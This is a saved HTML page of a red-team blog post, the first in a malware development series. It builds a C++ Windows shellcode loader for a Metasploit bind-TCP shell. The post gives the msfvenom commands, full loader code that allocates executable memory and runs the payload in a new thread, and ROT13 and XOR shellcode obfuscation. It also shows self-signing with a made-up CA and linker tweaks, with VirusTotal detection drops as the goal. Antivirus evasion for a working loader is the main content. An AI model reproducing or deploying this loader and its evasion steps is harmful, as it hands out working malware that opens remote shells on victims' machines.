<!DOCTYPE html>
<html><head>
    <title>Malware development part 1 – 0xPat blog – Red/purple teamer</title>

        <meta charset="utf-8">
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

    
    <meta name="description" content="Introduction
This is the first post of a series which regards development of malicious software. In this series we will explore and try to implement multiple techniques used by malicious applications to execute code, hide from defenses and persist.
Let’s create a C++  application that will run malicious shellcode while trying to not be caught by AV software.
Why C++ and not C# or PowerShell script? Because it’s much more difficult to analyze compiled binary when compared to managed code or script.
For the purpose of this and following articles we will use MS Visual Studio 2017 or 2019 on Windows 10.

">
    <meta property="og:description" content="Introduction
This is the first post of a series which regards development of malicious software. In this series we will explore and try to implement multiple techniques used by malicious applications to execute code, hide from defenses and persist.
Let’s create a C++  application that will run malicious shellcode while trying to not be caught by AV software.
Why C++ and not C# or PowerShell script? Because it’s much more difficult to analyze compiled binary when compared to managed code or script.
For the purpose of this and following articles we will use MS Visual Studio 2017 or 2019 on Windows 10.

">
    
    <meta name="author" content="0xPat blog">

    
    <meta property="og:title" content="Malware development part 1">
    <meta property="twitter:title" content="Malware development part 1">
    

    <!--[if lt IE 9]>
      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <link rel="stylesheet" type="text/css" href="Malware%20development%20part%201%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/style.css">
    <link rel="alternate" type="application/rss+xml" title="0xPat blog - Red/purple teamer" href="https://0xpat.github.io/feed.xml">

  </head>

  <body>
    <div class="wrapper-masthead">
      <div class="container">
        <header class="masthead clearfix">
          
          <div class="site-info">
            <h1 class="site-name"><a href="https://0xpat.github.io/">0xPat blog</a></h1>
            <p class="site-description">Red/purple teamer</p>
          </div>

          <nav>
            <a href="https://0xpat.github.io/">Blog</a>
            <a href="https://0xpat.github.io/about">About</a>
          </nav>
        </header>
      </div>
    </div>

    <div id="main" role="main" class="container">
      <article class="post">
  <h1>Malware development part 1</h1>

  <div class="entry">
    <h2 id="introduction">Introduction</h2>
<p>This is the first post of a series which regards development of 
malicious software. In this series we will explore and try to implement 
multiple techniques used by malicious applications to execute code, hide
 from defenses and persist.<br>
Let’s create a C++  application that will run malicious shellcode while trying to not be caught by AV software.<br>
Why C++ and not C# or PowerShell script? Because it’s much more 
difficult to analyze compiled binary when compared to managed code or 
script.<br>
For the purpose of this and following articles we will use MS Visual Studio 2017 or 2019 on Windows 10.</p>

<h3 id="how-detections-work">How detections work</h3>
<p>Antimalware solutions can use three types of detection mechanisms</p>
<ul>
  <li>signature-based detection - static inspection of file checksums 
(MD5, SHA1 etc.) and presence of known strings or byte sequences in the 
binary,</li>
  <li>heuristic detection - (usually) static analysis of application 
behavior and identification of potentially malicious characteristics 
(e.g. use of specific functions which are usually associated with 
malware),</li>
  <li>sandboxing - dynamic analysis of the program which gets executed 
in a controlled environment (sandbox) where its actions are monitored.</li>
</ul>

<p>Multiple techniques exist that evade different detection mechanisms. For example:</p>
<ul>
  <li>polymorphic (or at least often recompiled) malware can defeat signature-based detection,</li>
  <li>obfuscation of code flow can evade heuristics based detection,</li>
  <li>conditional statements based on environmental checks can detect and bypass sandboxes,</li>
  <li>encoding or encryption of sensitive information can help bypass signature-based detection as well as heuristic detection.</li>
</ul>

<h2 id="lets-get-to-work">Let’s get to work!</h2>
<h3 id="starting-new-project">Starting new project</h3>
<p>We begin with creating a fresh project - Windows C++ Console Application (x86).</p>

<p><img src="Malware%20development%20part%201%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VS_project.png" alt="Creating a new project in Visual Studio"></p>

<p><em>Creating a new project in Visual Studio</em></p>

<h3 id="generating-shellcode">Generating shellcode</h3>
<p>We will use Metasploit to generate some malicious shellcode - let it be bind TCP shell.</p>

<p><code class="language-plaintext highlighter-rouge">msfvenom -p windows/shell_bind_tcp LPORT=4444 -f c</code></p>

<p>Shellcodes are pieces of machine code designed to run local or remote
 system shell (hence the name). They are mainly used during exploitation
 of software vulnerabilities - when an attacker is able to control 
program’s execution flow he needs some universal payload to execute 
desired action (usually shell access). This applies to both local 
exploitation (e.g. for privilege escalation) and remote exploitation 
(for gaining RCE on a server).</p>

<p>Shellcode is a bootstrap code that leverage known platform-specific 
mechanics to execute specific actions (create a process, initiate TCP 
connection etc.). Windows shellcodes usually use TEB (Thread Environment
 Block) and PEB (Process Environment Block) to find address of loaded 
system libraries (<code class="language-plaintext highlighter-rouge">kernel32.dll</code>, <code class="language-plaintext highlighter-rouge">kernelbase.dll</code> or <code class="language-plaintext highlighter-rouge">ntdll.dll</code>) and then “browse” them to find addresses of <code class="language-plaintext highlighter-rouge">LoadLibrary</code> and <code class="language-plaintext highlighter-rouge">GetProcAddress</code> functions which then can be used to locate other functions.</p>

<p>Generated shellcode can be included in the binary as a string. 
Classic execution of char array involves casting this array to a pointer
 to a function like this:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
<span class="n">func</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">code</span><span class="p">;</span>
<span class="n">func</span><span class="p">();</span>
</code></pre></div></div>

<p>Or with this classic one-liner which I can never get right at the first time:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">code</span><span class="p">)();</span>
</code></pre></div></div>

<p>However I found it impossible to execute data on stack due to data 
execution prevention mechanisms (especially data on stack is protected 
from execution). While it is easy to achieve using GCC (with <code class="language-plaintext highlighter-rouge">-fno-stack-protector</code> and <code class="language-plaintext highlighter-rouge">-z execstack</code> flags) I didn’t manage to do it using Visual Studio and MSVC compiler. Well, it’s not that relevant.</p>

<p>Note: 
It may seem pointless to execute shellcode in an application, especially
 since we can just implement its features in C/C++. However there are 
situations when custom shellcode loader or injector needs to be 
implemented (for example to run shellcode generated by other tool). 
Besides executing known malicious code (like Metasploit shellcode) is a 
good proof-of-concept to test detection mechanisms and bypasses.</p>

<h3 id="executing-shellcode">Executing shellcode</h3>
<p>The actual way to execute shellcode is a bit different. We need to:</p>
<ul>
  <li>allocate a new memory region using <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc"><code class="language-plaintext highlighter-rouge">VirtualAlloc</code></a> (or <a href="https://docs.microsoft.com/pl-pl/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex"><code class="language-plaintext highlighter-rouge">VirtualAllocEx</code></a> for remote processes) Windows API function,</li>
  <li>fill it with the shellcode bytes (e.g. with <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory"><code class="language-plaintext highlighter-rouge">RtlCopyMemory</code></a> function which is basically a <code class="language-plaintext highlighter-rouge">memcpy</code> wrapper),</li>
  <li>create a new thread using <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread"><code class="language-plaintext highlighter-rouge">CreateThread</code></a> or <a href="https://docs.microsoft.com/pl-pl/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread"><code class="language-plaintext highlighter-rouge">CreateRemoteThread</code></a> function, respectively.</li>
</ul>

<p>Shellcode can be also executed using char array to function pointer 
cast, as long as the memory region which the shellcode resides in is 
marked as executable.</p>

<p>The source code of such an application will look like this:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">##include &lt;Windows.h&gt;
</span>
<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">const</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xfc\xe8\x82</span><span class="s"> (...) "</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">shellcode_exec</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="o">|</span><span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
	<span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">);</span>
	<span class="n">DWORD</span> <span class="n">threadID</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">threadID</span><span class="p">);</span>
	<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="testing-against-virustotal">Testing against VirusTotal</h2>
<p>Before publishing our executable we should make sure to remove some 
artifacts from the binary. It is a good idea to discard any debugging 
symbols and information - this can be achieved by switching build 
configuration to “Release” and disabling generation of debug information
 (linker configuration in project properties).</p>

<p>In particular,  PDB (Program Database) path is embedded in the binary
 by default when using Visual Studio. PDB is used for storing debugging 
information and the file is stored in the same directory as the 
executable (or DLL) itself. This path can give away some sensitive 
infomation - just imagine something like <code class="language-plaintext highlighter-rouge">"C:\users\nameSurname\Desktop\companyName\clientName\assessmentDate\MaliciousApp\Release\app.exe"</code>.</p>

<p>First let’s see what does VirusTotal think about the shellcode:</p>

<p><img src="Malware%20development%20part%201%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_shellcode.png" alt="VT shellcode"></p>

<p>How about the binary with embedded shellcode which gets executed right after start?</p>

<p><img src="Malware%20development%20part%201%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_binary.png" alt="VT binary"></p>

<p>Detection rate is slightly lower for our executable.</p>

<h2 id="shellcode-obfuscation">Shellcode obfuscation</h2>
<p>First thing which comes in mind is to modify the shellcode to evade static signatures based on its content.</p>

<p>We can try the simplest “encryption” - apply ROT13 cipher to all bytes of embedded shellcode - so <code class="language-plaintext highlighter-rouge">0x41</code> becomes <code class="language-plaintext highlighter-rouge">0x54</code>, <code class="language-plaintext highlighter-rouge">0xFF</code> becomes <code class="language-plaintext highlighter-rouge">0x0C</code> and so on. During execution the shellcode will get “decrypted” by substracting a value of <code class="language-plaintext highlighter-rouge">0x0D</code> (13) from every byte.</p>

<p>The code looks like the following:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">##include &lt;Windows.h&gt;
</span>
<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">const</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x09\xf5\x8f</span><span class="s"> (...) "</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">shellcode_exec</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="o">|</span><span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
	<span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">);</span>
	<span class="n">DWORD</span> <span class="n">threadID</span><span class="p">;</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">)[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="mi">13</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">threadID</span><span class="p">);</span>
	<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We can also use XOR encryption (with constant single-byte key) instead of Caesar Cipher:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">)[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="sc">'\x35'</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>However that didn’t help much:</p>

<p><img src="Malware%20development%20part%201%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_xor.png" alt="VT xor"></p>

<h2 id="making-the-app-more-legitimate">Making the app more legitimate</h2>
<h3 id="analyzing-empty-executable">Analyzing “empty” executable</h3>
<p>Analyzing malware detection systems behavior on VirusTotal we may 
notice that even a program that does basically nothing gets flagged as 
malicious by several AV engines.</p>

<p>Following code was compiled:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>and resulting executable was tested:</p>

<p><img src="Malware%20development%20part%201%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_empty.png" alt="VT empty"></p>

<p>This means that we need to deploy some techniques not necessarily related with the malicious shellcode itself.</p>

<h3 id="signing-the-binary">Signing the binary</h3>
<p>Some malware detection engines may flag unsigned binaries as 
suspicious. Let’s generate code signing infrastructure - we will need 
certificate authority and code-signing certificate:</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">makecert</span> <span class="na">-r -pe -n </span><span class="s2">"CN=Malwr CA"</span> <span class="na">-ss </span><span class="kd">CA</span> <span class="na">-sr </span><span class="kd">CurrentUser</span> <span class="na">-a </span><span class="kd">sha256</span> <span class="na">-cy </span><span class="kd">authority</span> <span class="na">-sky </span><span class="kd">signature</span> <span class="na">-sv </span><span class="kd">MalwrCA</span>.pvk <span class="kd">MalwrCA</span>.cer
<span class="nb">certutil</span> <span class="na">-user -addstore </span><span class="kd">Root</span> <span class="kd">MalwrCA</span>.cer
<span class="kd">makecert</span> <span class="na">-pe -n </span><span class="s2">"CN=Malwr Cert"</span> <span class="na">-a </span><span class="kd">sha256</span> <span class="na">-cy </span><span class="kd">end</span> <span class="na">-sky </span><span class="kd">signature</span> <span class="na">-ic </span><span class="kd">MalwrCA</span>.cer <span class="na">-iv </span><span class="kd">MalwrCA</span>.pvk <span class="na">-sv </span><span class="kd">MalwrCert</span>.pvk <span class="kd">MalwrCert</span>.cer
<span class="kd">pvk2pfx</span> <span class="na">-pvk </span><span class="kd">MalwrCert</span>.pvk <span class="na">-spc </span><span class="kd">MalwrCert</span>.cer <span class="na">-pfx </span><span class="kd">MalwrCert</span>.pfx
<span class="kd">signtool</span> <span class="kd">sign</span> <span class="na">/v /f </span><span class="kd">MalwrCert</span>.pfx <span class="na">/t </span><span class="kd">http</span>://timestamp.verisign.com/scripts/timstamp.dll <span class="kd">Malware</span><span class="err">.exe</span>
</code></pre></div></div>
<p>After executing above commands, we have generated “Malwr” certificate
 authority, imported it to our certificate store, created code-signing 
certificate in <code class="language-plaintext highlighter-rouge">.pfx</code> format and used it to sign the executable.</p>

<p>Note: Executable signing can be configured as Post-Build Event in Visual Studio Project properies:</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">signtool</span><span class="err">.exe</span> <span class="kd">sign</span> <span class="na">/v /f </span>$<span class="o">(</span><span class="kd">SolutionDir</span><span class="o">)</span><span class="kd">Cert</span>\MalwrSPC.pfx <span class="na">/t </span><span class="kd">http</span>://timestamp.verisign.com/scripts/timstamp.dll $<span class="o">(</span><span class="kd">TargetPath</span><span class="o">)</span>
</code></pre></div></div>

<p>Signed application has much smaller detection rate:</p>

<p><img src="Malware%20development%20part%201%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_sig.png" alt="VT sig"></p>

<h3 id="linked-libraries">Linked libraries</h3>
<p>Playing with Visual C++ project compilation and linking properties I 
found out that when you remove additional dependencies from Linker 
options (especially <code class="language-plaintext highlighter-rouge">kernel32.lib</code>), some antimalware engines will stop flagging the resulting executable as malicious. Interesting, since <code class="language-plaintext highlighter-rouge">kernel32.lib</code>
 static library will still be statically linked after compilation, 
because the executable needs to know where to locate essential API 
functions (from <code class="language-plaintext highlighter-rouge">kernel32.dll</code>).</p>

<p>Decrease your malware detection rate with this <strong>ONE WEIRD TRICK</strong>:</p>

<p><img src="Malware%20development%20part%201%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_sig_link.png" alt="VT sig_link"></p>

<h2 id="switching-to-x64">Switching to x64</h2>
<p>It’s 2020 and I think that most computers (especially user 
workstations) are running 64-bit systems. Let’s generate x64 bind shell 
payload and check it against VirusTotal:</p>

<p><code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f raw</code></p>

<p>Detection rate is significantly lower than for the x86 counterpart (23/51):</p>

<p><img src="Malware%20development%20part%201%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_shellcode_x64.png" alt="VT shellcode"></p>

<p>Compiled application which uses same techniques as earlier has very low detection rate:</p>

<p><img src="Malware%20development%20part%201%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_binary_x64.png" alt="VT shellcode"></p>

<h2 id="summary">Summary</h2>
<p>We crafted a simple shellcode loader and managed to significantly 
drop its detection rate using some non-sophisticated techniques. However
 it still gets detected by Microsoft Defender!</p>

<p>In the next article we will focus on sandbox detection and evasion techniques.</p>

  </div>

  <div class="date">
    Written on March 30, 2020
  </div>

  
</article>

    </div>

    <div class="wrapper-footer">
      <div class="container">
        <footer class="footer">
          



<a href="https://github.com/0xPat"><i class="svg-icon github"></i></a>

<a href="https://www.linkedin.com/in/patryk-czeczko"><i class="svg-icon linkedin"></i></a>


<a href="https://www.twitter.com/0xPat"><i class="svg-icon twitter"></i></a>



        </footer>
      </div>
    </div>

    

  

</body></html>